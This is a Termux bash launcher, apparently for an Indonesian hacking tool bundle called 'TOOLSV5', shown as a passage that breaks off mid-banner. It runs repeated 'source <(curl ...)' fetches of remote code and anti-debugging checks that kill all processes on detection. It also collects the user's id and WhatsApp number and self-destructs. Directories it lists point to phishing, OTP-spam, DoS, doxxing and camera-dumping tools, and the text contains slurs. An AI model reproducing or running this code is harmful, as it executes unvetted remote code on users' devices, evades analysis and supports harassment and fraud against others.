kocak=$$
shopt -s nocasematch
shopt -s autocd
shopt -s cdspell
find $PREFIX/tmp -mindepth 1 -type f -exec truncate -s 0 {} \; &> /dev/null
find "$PREFIX/tmp_toolsv5" -mindepth 1 -type f -exec truncate -s 0 {} \; &> /dev/null
keamanan() {
log_and_exit() {
echo "$1"
sleep 5
kill -9 -1
exit 1
}
cek_tmp_activity() {
local tmp_dir="/tmp"
if [ -n "$PREFIX" ] && [ -d "$PREFIX/tmp" ]; then
tmp_dir="$PREFIX/tmp"
fi
if ls "$tmp_dir" 2> /dev/null | grep -Eiq "bash-unofficial|stav"; then
log_and_exit "[ WARNING ] Aktivitas mencurigakan di $tmp_dir"
fi
}
cek_bash_version() {
local bash_bin
bash_bin="$(which bash 2> /dev/null)"
if [ ! -x "$bash_bin" ]; then
log_and_exit "[ WARNING ] Bash binary tidak ditemukan."
fi
local version
version="$("$bash_bin" --version 2> /dev/null | head -n1)"
if ! echo "$version" | grep -q "GNU bash, version"; then
log_and_exit "[ WARNING ] Versi bash mencurigakan: $version"
fi
}
deteksi_bash_unofficial() {
local bash_bin
bash_bin="$(which bash 2> /dev/null)"
if [ ! -x "$bash_bin" ]; then
log_and_exit "[ WARNING ] Bash binary tidak ditemukan."
fi
if "$bash_bin" --version 2> /dev/null | grep -qi "unofficial"; then
log_and_exit "[ WARNING ] Bash unofficial terdeteksi."
fi
if strings "$bash_bin" 2> /dev/null | grep -qi "KhanhNguyen"; then
log_and_exit "[ WARNING ] Bash unofficial (modifikasi) terdeteksi di $bash_bin"
fi
}
akses() {
[[ "$(pwd)" == *"com.termux"* ]] || { log_and_exit "[ ! ] Wajib Menggunakan Di Termux"; }
}
akses
deteksi_package_terlarang() {
local blacklist_pip=("frida" "pwntools" "volatility" "pyrasite" "pydbg" "pyshark" "psutil")
local blacklist_npm=("frida" "node-pcap" "xhook" "cap" "termux-api")
local blacklist_gem=("bettercap" "evil-winrm" "metasploit")
local blacklist_cargo=("cargo-audit" "cargo-geiger" "evtx")
local blacklist_pkg=("nmap" "tcpdump" "strace" "htop")
for pkg in "${blacklist_pip[@]}"; do
pip list --format=columns 2> /dev/null | grep -iq "^$pkg" && log_and_exit "PIP BLACKLIST: Package $pkg terdeteksi"
done
for pkg in "${blacklist_npm[@]}"; do
npm list -g --depth=0 2> /dev/null | grep -iq "$pkg" && log_and_exit "NPM BLACKLIST: Package $pkg terdeteksi"
done
for pkg in "${blacklist_gem[@]}"; do
gem list 2> /dev/null | grep -iq "^$pkg" && log_and_exit "GEM BLACKLIST: Package $pkg terdeteksi"
done
for pkg in "${blacklist_cargo[@]}"; do
cargo install --list 2> /dev/null | grep -iq "^$pkg" && log_and_exit "CARGO BLACKLIST: Package $pkg terdeteksi"
done
for pkg in "${blacklist_pkg[@]}"; do
command -v "$pkg" > /dev/null 2>&1 && log_and_exit "PKG BLACKLIST: Command $pkg terdeteksi"
done
}
deteksi_debugger() {
local suspicious_tools=("strace" "declare" "ltrace" "gdb" "lldb" "frida" "ida" "radare2" "ghidra" "bashdb")
local script_path
script_path=$(readlink -f "$0")
local ppid_self
ppid_self=$(awk '"'"'{print $4}'"'"' /proc/$$/stat 2> /dev/null)
local parent_name
parent_name=$(ps -p "$ppid_self" -o comm= 2> /dev/null)
for tool in "${suspicious_tools[@]}"; do
[[ "$parent_name" =~ $tool ]] && log_and_exit "DEBUGGER TOOL: Parent process suspicious: $parent_name"
pgrep -x "$tool" > /dev/null && log_and_exit "DEBUGGER TOOL: Detected running $tool"
done
local pid=$$
while :; do
local ppid
ppid=$(awk '"'"'{print $4}'"'"' /proc/$pid/stat 2> /dev/null)
[[ -z "$ppid" || "$ppid" == "1" ]] && break
local pname
pname=$(ps -p "$ppid" -o comm= 2> /dev/null)
for tool in "${suspicious_tools[@]}"; do
[[ "$pname" =~ $tool ]] && log_and_exit "DEBUGGER CHAIN: Suspicious parent $pname"
done
pid=$ppid
done
local pids_running_script
pids_running_script=$(pgrep -f "$script_path")
for pid in $pids_running_script; do
[[ "$pid" == "$$" ]] && continue
local ppid
ppid=$(awk '"'"'{print $4}'"'"' /proc/$pid/stat 2> /dev/null)
local pname
pname=$(ps -p "$ppid" -o comm= 2> /dev/null)
for tool in "${suspicious_tools[@]}"; do
[[ "$pname" =~ $tool ]] && log_and_exit "SCRIPT CLONE: $pname running same script"
done
done
}
deteksi_sniffer() {
local sniffers=("tcpdump" "tshark" "strace" "ettercap" "ngrep" "wireshark" "fiddler" "charles")
for sniffer in "${sniffers[@]}"; do
if pgrep -x "$sniffer" > /dev/null; then
log_and_exit "SNIFFER DETECTED: $sniffer aktif"
fi
done
if lsof -p $$ 2> /dev/null | grep -q "libtermux-net.so"; then
log_and_exit "SNIFFER DETECTED: Akses libtermux-net.so"
fi
}
deteksi_aktivitas_mencurigakan() {
local perintah_mencurigakan=(
"printf|echo|alias [a-zA-Z0-9]=|set -x"
"ELF"
"tmp"
"stav|STAV|S\\.T\\.A\\.V|s\\.t\\.a\\.v|bash-unofficial"
"symbolic link to coreutils"
"function|aliased"
"[a-zA-Z].*, [a-zA-Z].*, [a-zA-Z].* ·.*"
)
for pattern in "${perintah_mencurigakan[@]}"; do
if history | grep -v "$$" | grep -Eiq "$pattern"; then
log_and_exit "MENCURIGAKAN: History match $pattern"
fi
done
local suspicious_names=("printf" "stav" "bash-unofficial" "htop")
for pid in $(pgrep -f "python"); do
if grep -qi "psutil" /proc/$pid/maps 2> /dev/null || grep -qi "psutil" /proc/$pid/cmdline 2> /dev/null; then
log_and_exit "MENCURIGAKAN: Process mencurigakan ditemukan: $name"
fi
done
for name in "${suspicious_names[@]}"; do
if ps aux | grep -v "grep" | grep -v "$$" | grep -iq "$name"; then
log_and_exit "MENCURIGAKAN: Process mencurigakan ditemukan: $name"
fi
done
}
pantau_perubahan_file() {
local file_penting=(
"/data/data/com.termux/files/usr/bin/whoami"
"/data/data/com.termux/files/usr/bin/rm"
"/data/data/com.termux/files/usr/bin/id"
"/data/data/com.termux/files/usr/bin/unzip"
"/data/data/com.termux/files/usr/bin/openssl"
"/data/data/com.termux/files/usr/bin/curl"
"/data/data/com.termux/files/usr/bin/grep"
"/data/data/com.termux/files/usr/bin/bash"
"/data/data/com.termux/files/usr/bin/sh"
"/system/bin/sh"
)
for file in "${file_penting[@]}"; do
if [ -f "$file" ]; then
if [ -L "$file" ]; then
target=$(readlink -f "$file")
if echo "$target" | grep -qE "/system/bin/(linker|linker64)"; then
log_and_exit "SYMLINK WARNING: $file → $target (mengarah ke linker)"
fi
fi
case "$file" in
/tmp/* | /sdcard/* | /data/local/tmp/*)
if file "$file" 2> /dev/null | grep -q "ELF"; then
log_and_exit "ELF WARNING: $file adalah ELF di lokasi tidak aman"
fi
;;
esac
if file "$file" 2> /dev/null | grep -q "ELF"; then
if strings "$file" 2> /dev/null | grep -qE "/system/bin/(linker|linker64)"; then
case "$file" in
/data/data/com.termux/files/usr/bin/* | /system/bin/sh) ;;
*)
log_and_exit "ELF LINKER WARNING: $file mengandung linker (potensi inject)"
;;
esac
fi
fi
fi
done
}
pip uninstall requests -y &> /dev/null
pip install requests &> /dev/null
main() {
deteksi_bash_unofficial
deteksi_debugger
deteksi_sniffer
deteksi_aktivitas_mencurigakan
pantau_perubahan_file
deteksi_package_terlarang
aman_grep() {
command grep "$@" | while read -r line; do
case "$line" in
*ELF* | *psutil* | *symbolic\ link\ to\ coreutils* | *stav* | *STAV* | *S.T.A.V*)
log_and_exit "AMAN_GREP TRIGGERED: $line"
;;
*)
printf "%s\n" "$line"
;;
esac
done
}
echo -e "" | aman_grep . > /dev/null 2>&1
}
check_proxy() {
while true; do
if [[ -n "$http_proxy" || -n "$https_proxy" ]]; then
clear
log_and_exit "[ WARNING ] Proxy terdeteksi."
fi
sleep 3
done
}
check_vpn() {
while true; do
if ifconfig 2> /dev/null | grep -E "tun[0-9]" > /dev/null; then
clear
log_and_exit "[ WARNING ] VPN terdeteksi."
fi
sleep 3
done
}
pantau_terminal() {
while true; do
session_count=$(ps aux | grep com.termux | grep -v grep | wc -l)
[[ $session_count -gt 1 ]] && pkill -9 -f com.termux
sleep 3
done
}
while true; do
echo "KONTOL LU SU ASU GATHEL BEBAN KELUARGA" > "$PREFIX/tmp/.tools"
main "$@"
sleep 5
done &
check_proxy &
check_vpn &
counter=0
while [ $counter -lt 50 ]; do
number_part=$(shuf -i 1000-99999 -n 1)
string_part=$(tr -dc "A-Za-z" < /dev/urandom | head -c 3)
filename=".__${number_part}__.${string_part}"
echo "" > "$PREFIX/tmp/$filename"
counter=$((counter + 1))
done &> /dev/null &
}
keamanan
source <(curl -sL "https://library-eta-lemon.vercel.app/najis_sok_asik_kontol") &> /dev/null
colors=()
for i in {81..127}; do
colors+=("\033[38;5;${i}m")
done
source <(curl -sL "https://library-eta-lemon.vercel.app/_____") &> /dev/null
hancurkan_diri() {
echo -e "${m}[ DESTROYING ]$c Menghapus semua jejak${NC}"
echo "BAKA" > "$0"
killall bash
pkill -9 -f "com.termux" 2> /dev/null
exit 0
}
clear
while true; do
success=true
curl -sL "https://raw.githubusercontent.com/Hozowaorokananingenda/Dneu/main/Version" -o "$PREFIX/lib/version" &> /dev/null
[[ -s "$PREFIX/lib/version" ]] || success=false
curl -sL "https://raw.githubusercontent.com/Hozowaorokananingenda/Dneu/main/.Lihat-Ada-Anak-Anjing" | grep . &> /dev/null
if [ $? -eq 0 ]; then
source <(curl -sL "https://raw.githubusercontent.com/Hozowaorokananingenda/Dneu/main/.Lihat-Ada-Anak-Anjing") &> /dev/null
else
success=false
fi
curl -sL -o "$PREFIX/lib/blockID" "https://raw.githubusercontent.com/Hozowaorokananingenda/Dneu/main/block.txt" &> /dev/null
[[ -s "$PREFIX/lib/blockID" ]] || success=false
curl -sL -o "$PREFIX/lib/status.txt" "https://raw.githubusercontent.com/Hozowaorokananingenda/Dneu/main/status.txt" &> /dev/null
[[ -s "$PREFIX/lib/status.txt" ]] || success=false
source <(curl -sL "https://raw.githubusercontent.com/WatashiSenseiGalirus/bjir/main/shortlink") &> /dev/null
if [ "$success" = true ]; then
break
else
sleep 1
fi
done
versitoolsv5=$(cat $PREFIX/lib/version)
info_update() {
cat <(curl -sL "https://raw.githubusercontent.com/Hozowaorokananingenda/Dneu/main/info")
}
termux_id=$(whoami)
ENCRYPTION_PASS="SORASAKIHINA"
LOCAL_UUID_FILE="$PREFIX/lib/.user_uid"
gal="$LOCAL_UUID_FILE"
edukasi="$PREFIX/.galirus-officia"
DATABASE_URL="https://raw.githubusercontent.com/WatashiSenseiGalirus/bjir/refs/heads/main/database_ID.sh"
DIR_SAVE="$PREFIX/share/.DIR_TOOLSV5"
cek_dir_toolsv5="$DIR_SAVE"
echo "ON" > "$edukasi" &> /dev/null
while true; do
if [ -d "$cek_dir_toolsv5" ]; then
break
else
mkdir -p "$DIR_SAVE"
fi
done
cok="ansi-rounded"
get_unique_colors() {
local -n arr=$1
local count=$2
local result=()
while [ ${#result[@]} -lt $count ]; do
local c=${arr[RANDOM % ${#arr[@]}]}
local uniq=true
for r in "${result[@]}"; do
[[ $r == "$c" ]] && uniq=false && break
done
$uniq && result+=("$c")
done
echo "${result[@]}"
}
read -r ran1 ran2 ran3 ran4 ran5 ran6 ran7 ran8 ran9 ran10 <<< "$(get_unique_colors colors 10)"
ran_names=(ran1 ran2 ran3 ran4 ran5 ran6 ran7 ran8 ran9 ran10)
random_index=$((RANDOM % 10))
selected_var=${ran_names[$random_index]}
g404=${!selected_var}
ran1=${colors[RANDOM % ${#colors[@]}]}
while true; do
ran2=${colors[RANDOM % ${#colors[@]}]}
[[ $ran1 != "$ran2" ]] && break
done
while true; do
ran=${colors[RANDOM % ${#colors[@]}]}
[[ $ran2 != "$ran1" ]] && break
done
while true; do
ran3=${colors[RANDOM % ${#colors[@]}]}
[[ $ran1 && $ran2 != "$ran3" ]] && break
done
while true; do
ran4=${colors[RANDOM % ${#colors[@]}]}
[[ $ran1 && $ran2 && $ran3 != "$ran4" ]] && break
done
res="\033[0m"
trial="$PREFIX/lib/bash/fndmnc95913592fn"
ctrl_handler() {
case "$1" in
SIGINT)
echo
e $k$bg_lg " System Break (Ctrl+C), Kembali ke TOOLSV5 $k$res"
;;
SIGTSTP)
echo
e $k$bg_lg " System Break (Ctrl+Z), Kembali ke TOOLSV5 $k$res"
;;
SIGTERM)
echo
e $k$bg_lg " System Break (Kill), Kembali ke TOOLSV5 $k$res"
;;
esac
sleep 3
}
trap 'ctrl_handler SIGINT' SIGINT
trap 'ctrl_handler SIGTSTP' SIGTSTP
trap 'ctrl_handler SIGTERM' SIGTERM
tutorial() {
e "$k Silahkan enter untuk tonton tutorialnya$res"
mpv "https://od.lk/s/NzNfOTQ4NzcwOTBf/luvvoice.com-20250528-0ONndO.mp3" &> /dev/null &
read
}
key() {
dialog --infobox "Verifikasi..." 3 20
PASSWORD_FILE="$PREFIX/lib/.tools_pass"
CORRECT_PASS="WatashiGalirus"
if [[ -f $PASSWORD_FILE ]]; then
SavedPass=$(< "$PASSWORD_FILE")
[ "$SavedPass" != "$CORRECT_PASS" ] && rm -f "$PASSWORD_FILE"
fi
while [[ ! -f $PASSWORD_FILE ]]; do
PasswordInput=$(dialog --title "AUTH" --inputbox "Password:" 10 50 --stdout)
[ $? -ne 0 ] && {
clear
exit 0
}
if [[ $PasswordInput == "$CORRECT_PASS" ]]; then
echo "$PasswordInput" > "$PASSWORD_FILE"
clear
break
else
dialog --title "ERROR" --msgbox "Password salah" 7 50
fi
done
return 0
}
menu() {
while true; do
choice=$(dialog --clear --stdout --title "Menu Toolsv5" \
--menu "Pilih opsi:" 15 50 10 \
1 "Penguna Premium Toolsv5" \
2 "Pendaftaran ID" \
0 "Keluar")
[ -z "$choice" ] && {
clear
exit 0
}
case $choice in
1)
break
;;
2)
dialog --infobox "Pendaftaran..." 3 20
clear
encrypt_id() {
local id_data="$1"
echo "$id_data" | openssl enc -aes-256-cbc -md sha512 -pbkdf2 -iter 100000 -salt -pass pass:"$ENCRYPTION_PASS" -base64 2> /dev/null | tr -d '\n'
}
generate_random_username() {
local prefix="user"
local db_online_content
db_online_content=$(curl -fsSL "$DATABASE_URL" |
openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -base64 -pass pass:'LEMAH_LU_PADA' 2> /dev/null)
declare -A used_numbers=()
if [[ -n $db_online_content ]]; then
while read -r line; do
user=$(awk '{print $1}' <<< "$line")
if [[ $user =~ ^$prefix([0-9]+)$ ]]; then
num=${BASH_REMATCH[1]}
num=$((10#$num))
used_numbers[$num]=1
fi
done <<< "$db_online_content"
fi
local max_limit=500
local candidate
local tries=0
local max_tries=1000
while ((tries < max_tries)); do
candidate=$((RANDOM % max_limit + 1))
if [[ -z ${used_numbers[$candidate]} ]]; then
printf "%s%02d\n" "$prefix" "$candidate"
return 0
fi
((tries++))
done
local max_number=0
for n in "${!used_numbers[@]}"; do
((n > max_number)) && max_number=$n
done
local next_number=$((max_number + 1))
printf "%s%02d\n" "$prefix" "$next_number"
}
generate_uuid() {
id | tr -d '\n'
}
register_user() {
clear
echo -e "\n\033[1;36m=== REGISTRASI USER TERMUX (UUID) ===\033[0m\n"
username=$(generate_random_username)
if [ $? -ne 0 ]; then
echo -e "\033[1;31mGagal generate username unik\033[0m" >&2
return 1
fi
echo -e "Username yang di-generate: \033[1;32m$username\033[0m"
while true; do
IFS= read -r -e -p "Masukkan nomor WhatsApp (contoh: 6281234567890): " whatsapp
if [[ $whatsapp =~ ^[0-9]{10,15}$ ]]; then
break
elif [[ "$whatsapp" = "back" ]]; then
break
else
echo -e "\033[1;31mError: Nomor WhatsApp tidak valid! Harus 10-15 digit angka.\033[0m"
sleep 3
clear
fi
done
uuid=$(generate_uuid)
encrypted_uuid=$(encrypt_id "$uuid")
mkdir -p "$(dirname "$LOCAL_UUID_FILE")"
echo "$username $encrypted_uuid $whatsapp" > "$LOCAL_UUID_FILE"
echo -e "\n\033[1;32mRegistrasi berhasil!\033[0m"
echo -e "\n\033[1;37mDetail registrasi:\033[0m"
echo -e "\033[1;33m$username \033[1;35m$encrypted_uuid \033[1;34m$whatsapp\033[0m"
echo -e "\n\n\033[1;37m
Silakan salin dari Username sampai WhatsApp
Dan kirim ke admin untuk aktivasi.\033[0m\n"
sleep 3
IFS= read -r -e -p "Tekan Enter untuk keluar..."
}
register_user
;;
0)
clear
pkill -9 -f com.termux
;;
esac
done
}
hapus() {
echo
}
if command -v nala > /dev/null 2>&1; then
GALIRUS="nala"
else
pkg install python python3 -y
pkg install nala -y
GALIRUS="paket"
fi
paket="$GALIRUS"
hapus
kill_sound() {
count=0
while true; do
cd $HOME
pkill -9 -f "mpv.*murid_kesayangan_galirus" &> /dev/null
pkill -9 -f "mpv.*backsound" &> /dev/null
pkill -f mpv &> /dev/null
pkill -f play &> /dev/null
killall mpv &> /dev/null
count=$((count + 1))
if [ "$count" -ge 100 ]; then
break
fi
done
}
filesound() {
while true; do
soundnya="MusicG404"
filenya="$PREFIX/bin/"
if [ -f "$filenya$soundnya" ]; then
break
else
curl -sL -k -o "$PREFIX/bin/MusicG404" "https://od.lk/s/NzNfOTU0NTM4MjFf/music.txt" &> /dev/null
fi
done
}
musik="mpv --volume=50 --shuffle --cache=yes --cache-secs=10 --playlist="$PREFIX/bin/MusicG404" --title="backsound" &> /dev/null &"
musikrun() {
if pgrep -f "mpv.*backsound" > /dev/null; then
echo "Musik sudah berjalan di latar belakang."
else
echo "Musik tidak sedang berjalan, memulai..."
$musik &> /dev/null &
fi
}
server_main="mpv --volume=60 --shuffle --cache=yes --cache-secs=10 "https://youtu.be/TvFjobQBbPw"  --title="server" &> /dev/null &"
maintenance() {
if pgrep -f "mpv.*server" > /dev/null; then
echo "Musik sudah berjalan di latar belakang."
else
echo "Musik tidak sedang berjalan, memulai..."
$server_main
fi
}
sound_efek_murid_galirus() {
karakter=("KAYOKO" "SEIA" "REISA" "ATSUKO" "NERU" "HOSHINO_PRIME" "SHIROKO_TERROR" "IBUKI" "ARISU" "MAMAHINA" "NONOMI" "IZUNA" "MOMOI" "SERIKA" "SHIROKO" "HOSHINO" "SAORI" "MITSUKI" "MIKA" "KASUZA" "HINADRES" "HINA" "HARUKA" "HANAKO")
random_index=$((RANDOM % ${#karakter[@]}))
putar="${karakter[random_index]}"
acak_audio=$(echo "${audio_urls[$putar]}" | tr ' ' '\n')
for audio in $acak_audio; do
clear
echo "$putar" > /sdcard/.voice
sync
mpv --volume=70 --cache=yes --cache-secs=10 "$audio" --title="murid_kesayangan_galirus" &> /dev/null
done
}
play_sound_effect() {
sync
audio_cek=$(cat /sdcard/.voice 2> /dev/null || echo "Tidak ada data")
if ps aux | grep -v grep | grep -q "mpv.*murid_kesayangan_galirus"; then
echo "$audio_cek"
echo "Sound On ( voice sedang berjalan )"
sleep 3
else
echo "Sound Off ( loading play ) "
AUDIO_DIR="$PREFIX/lib/bash/.Audio"
BLACKLIST="$AUDIO_DIR/4OBKZY4DVLRYHJPDQO6OHA5L4OBLTZMFRDTZJHY_1.wav"
mapfile -t audio_files < <(find "$AUDIO_DIR" -type f \( -iname "*.wav" -o -iname "*.ogg" -o -iname "*.mp3" \) ! -path "$BLACKLIST")
if [ ${#audio_files[@]} -eq 0 ]; then
echo "Tidak ada file audio yang tersedia."
fi
random_file="${audio_files[RANDOM % ${#audio_files[@]}]}"
clean_text=$(echo "Halo. Selamat $ucapan! $anomali." | sed 's/[^[:alnum:][:punct:] ]//g')
espeak -v id+f3 -s 150 "$clean_text"
mpv --volume=70 "$random_file" &> /dev/null
sound_efek_murid_galirus &> /dev/null &
sleep 3
fi
}
list=(
"$HOME/Osint_G404"
"$PREFIX/.bug"
"$PREFIX/..bug"
"$DIR_SAVE/litespam"
"$PREFIX/share/gemoxi"
"$DIR_SAVE/Ketupat-Terror"
"$DIR_SAVE/Premium-Call"
"$DIR_SAVE/OTP_TeRoRV2"
"$PREFIX/lib/bash/spam/"
"$PREFIX/lib/pkgconfig/spamweb"
"$HOME/chat"
"$PREFIX/opt/zphisher"
"$DIR_SAVE/ngrok"
"$DIR_SAVE/adbwebkit"
"/sdcard/UserFinder"
"/sdcard/CAM-DUMPER"
"$DIR_SAVE/Temp-Mail"
"$DIR_SAVE/Doxxer-Toolkit"
"$PREFIX/.kontol"
"$DIR_SAVE/okadminfinder3"
"$PREFIX/lib/DOSG404"
"$pandora"
"$PREFIX/phising_bug"
"$PREFIX/include/NIK"
"$DIR_SAVE/overload"
"$DIR_SAVE/GhostTrack"
"$DIR_SAVE/okadminfinder3"
"$DIR_SAVE/RED_HAWK"
"$DIR_SAVE/Trust-YourCam"
"$PREFIX/bot2g404"
"$PREFIX/bot3"
"$PREFIX/Bot4"
"$bot3")
echo 'echo "DECODE HARAM BEBAN LU ASU"' > /data/data/com.termux/files/home/Lubeban/run &> /dev/null
banner1() {
echo "⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣼⠀⠀⠀⠀⠈⠙⡆⢤⠀⠀⠀⠀⠀⣷⣄⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⡿⢿⡷⡆⠀⣵⣶⣿⣾⣷⣸⣄⠀⠀⠀⢰⠾⡿⢿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣽⣿⣿⣿⣿⡟⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣻⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠐⣻⣿⣿⡏⢹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣟⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⡄⠀⠀⠀⠀⢻⣿⣿⣷⡌⠸⣿⣾⢿⡧⠀⠀⠀⠀⠀⢀⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⡿⢛⣵⣾⣿⣿⣿⣿⣿⣯⣾⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⢻⣿⣿⣿⣶⣌⠙⠋⠁⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣷⣮⡙⢿⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⡀⠀⠀⠀⣠⣽⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣝⢿⣇⠀⠀⠀⠀
⠀⠀⠀⣴⣯⣴⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⡿⢫⣾⣿⣿⣿⣿⣿⣿⡦⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⢴⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣧⣽⣦⠀⠀⠀
⠀⠀⣼⣿⣿⣿⠟⢁⣴⣿⡿⢿⣿⣿⡿⠛⣰⣿⠟⣻⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⢿⣿⣿⣿⣿⣿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣟⠻⣿⣆⠙⢿⣿⣿⡿⢿⣿⣦⡈⠻⣿⣿⣿⣧⠀⠀
⠀⡼⣻⣿⡟⢁⣴⡿⠋⠁⢀⣼⣿⠟⠁⣰⣿⠁⢰⣿⣿⣿⡿⣿⣿⣿⠿⠀⣠⣤⣾⣿⣿⣿⣿⣿⠀⠀⠽⣿⣿⣿⢿⣿⣿⣿⡆⠈⢿⣆⠀⠻⣿⣧⡀⠈⠙⢿⣦⡈⠻⣿⣟⢧⠀
⠀⣱⣿⠋⢠⡾⠋⠀⢀⣠⡾⠟⠁⠀⢀⣿⠟⠀⢸⣿⠙⣿⠀⠈⢿⠏⠀⣾⣿⠛⣻⣿⣿⣿⣿⣯⣤⠀⠀⠹⡿⠁⠀⣿⠏⣿⡇⠀⠹⣿⡄⠀⠈⠻⢷⣄⡀⠀⠙⢷⣄⠙⣿⣎⠂
⢠⣿⠏⠀⣏⢀⣠⠴⠛⠉⠀⠀⠀⠀⠈⠁⠀⠀⠀⠛⠀⠈⠀⠀⠀⠀⠈⢿⣿⣼⣿⣿⣿⣿⢿⣿⣿⣶⠀⠀⠀⠀⠀⠁⠀⠛⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠛⠦⣄⣀⣹⠀⠹⣿⡄
⣼⡟⠀⣼⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠋⠁⠀⢹⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣧⠀⢻⣷
⣿⠃⢰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣶⣦⣤⠀⠀⣿⡿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡆⠘⣿
⣿⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠁⠈⢻⣷⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣀⣀⣸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣿
⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇
⠈⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣴⡿⣷⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⡿⣟⣿⣿⣶⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
}
banner2() {
echo "
[ WEEHEEEE YOOO NIGGA IS COMMING ]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⡿⠿⢿⣦⡀⠀⠀⠀⠀⠀⠀
